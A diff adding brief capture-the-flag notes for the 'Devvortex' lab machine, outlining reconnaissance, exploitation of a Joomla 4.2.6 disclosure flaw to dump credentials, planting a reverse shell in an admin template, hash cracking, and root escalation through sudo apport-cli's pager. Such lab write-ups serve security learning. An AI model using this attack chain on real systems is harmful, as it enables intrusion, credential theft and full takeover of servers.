@@ -1,0 +1,12 @@
+#foothold
+nmap sT
+gobuster vhost -u devvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt or ffuf with -H "Host: FUZZ.devvortex.htb" ...
+diclosure /administrator -> joomla -> joomscan -> joomla 4.2.6 vuln CVE-2023–23752 (Data exfiltration) -> PoC -> Database exfiltration
+login joomla -> System -> Templates -> Administrator Templates -> login.php edit with revshell ->foothold 
+#user
+mysql with exfiltration PoC previous executed -> retrieve logan hash
+hash -> john or hashcat -> password -> ssh password -> user flag
+#root
+sudo -l -> apport-cli -> generate crash file in /var/crash with sleep 13 & killall -SIGSEGV sleep
+sudo apport-cli -c /var/crash/xxx.crash -> press v key ->  :!id -> :!cat /root/root.txt -> root flag
+
